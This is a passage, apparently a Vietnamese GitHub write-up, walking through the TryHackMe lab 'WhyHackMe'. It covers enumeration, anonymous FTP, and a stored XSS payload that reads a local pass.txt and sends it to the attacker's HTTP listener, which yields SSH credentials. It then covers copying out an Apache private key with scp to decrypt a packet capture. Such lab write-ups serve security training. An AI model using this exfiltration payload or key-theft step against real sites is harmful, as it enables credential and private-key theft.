# WhyHackMe-TryHackMe

recon

<img width="1273" height="629" alt="image" src="https://github.com/user-attachments/assets/871a24ad-7c08-4a74-9286-868099a95811" />

enumerating

└─$ gobuster dir -u http://10.201.5.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt

<img width="970" height="680" alt="image" src="https://github.com/user-attachments/assets/cb41927b-860f-4653-9606-d868ad661fb3" />

<img width="1278" height="766" alt="image" src="https://github.com/user-attachments/assets/b60464f7-e27e-4ffa-9d87-c34203d4486b" />

vì port 21 được mở tôi thử truy cập vào ftp với người dùng anonymous và thấy 1 tệp là update.txt

<img width="1267" height="412" alt="image" src="https://github.com/user-attachments/assets/8a8c6abc-d9d6-4265-8d5c-901ba136fc07" />

tôi thử tải về và đọc 

ở đây có một tệp có tên là pass.txt chỉ có thể truy cập được trên web cho máy cục bộ

<img width="1274" height="187" alt="image" src="https://github.com/user-attachments/assets/42972f94-ac72-4cfb-bf4f-589036dd98c1" />

tôi sẽ quay lại trang /register.php

về việc đăng ký tài khoản thì dễ dàng sau đó login vào

<img width="1282" height="618" alt="image" src="https://github.com/user-attachments/assets/7e497179-653d-4f98-a642-84152a5e5032" />

sau khi login thành công nó hiện liên kết qua trang blog 

thì sau khi đăng nhập trang blog hiển thị bình luận sau 

<img width="1265" height="773" alt="image" src="https://github.com/user-attachments/assets/ece3ce5b-0cad-4278-91a5-664c72459fb7" />

tôi quay lại trang register đăng ký tên người dùng là <script>alert(1)</script> và mật khẩu bất kỳ 

sau đó đăng nhập vào blog viết 1 bình luận bất kỳ và nó hiển thị : 

<img width="1273" height="648" alt="image" src="https://github.com/user-attachments/assets/388ffc94-2bef-400d-95a6-283364d0de9f" />

điều này xác nhập là có thể tấn công qua lỗ hổng XSS
 
tôi tham khảo được lệnh XSS này 

<script>fetch("http://127.0.0.1/dir/pass.txt").then(response => response.text()).then(data => fetch("http://10.14.108.226:8080/?data=" + encodeURIComponent(data)));</script>

dùng nó đăng ký tên đăng nhập với mật khẩu bất kỳ 

khởi chạy

└─$ python3 -m http.server 8080

sau đó bình luận trên trang blog 

<img width="904" height="169" alt="image" src="https://github.com/user-attachments/assets/6dfab6e8-8c00-4b46-b603-e68745b1af94" />

tôi nhận được dữ liệu dường như nó là username và password

jack:WhyIsMyPasswordSoStrongIDK

tôi dùng nó để đăng nhập ssh thành công sau đó cờ người dùng ngay vị trí hiện tại

<img width="853" height="648" alt="image" src="https://github.com/user-attachments/assets/92204417-8383-4a25-a2c0-4fe00adbe036" />

sau đó tôi tìm cách leo quyền 

<img width="908" height="348" alt="image" src="https://github.com/user-attachments/assets/641bf96d-eccc-4f9d-985b-4618bad931a1" />

có dịch vụ hoạt động trên cổng 41312

tôi đã cố truy cập nhưng không thành công 

<img width="1271" height="283" alt="image" src="https://github.com/user-attachments/assets/6cb0b857-2f79-435d-8231-45abad414846" />

ở thư mục /opt ta có 2 file thú vị 

lấy file pcap về máy kali tôi 

scp capture.pcap doankhanh@10.14.108.226:/home/doankhanh/Documents/WhyHackMe

<img width="1245" height="150" alt="image" src="https://github.com/user-attachments/assets/5704ff12-ecff-4535-bf85-6a1ce726acb7" />

<img width="1256" height="782" alt="image" src="https://github.com/user-attachments/assets/3277d6d1-ac7d-4c6f-b3e6-793b13e14ef6" />

sau khi bật wireshark lên xem nhưng nội dung đã bị mã hóa nên tôi dùng cách khác 

sử dụng lệnh 

find / -type f -name "*.key" 2>/dev/null

và thấy được đường dẫn lưu trữ khóa 

/etc/apache2/certs/apache.key

đưa nó về máy của tôi 

scp /etc/apache2/certs/apache.key doankhanh@10.14.108.226:/home/doankhanh/Documents/WhyHackMe

quay lại wireshark và điều hướng đến Edit -> Prefernces -> TLS

vào tùy chọn edit trong RSA Keys List và nhập IP, cổng, giao thức và vị trí của khóa vừa lấy về 

<img width="1264" height="800" alt="image" src="https://github.com/user-attachments/assets/3a123d12-bb45-4ced-8b4c-71bf68e5ab42" />
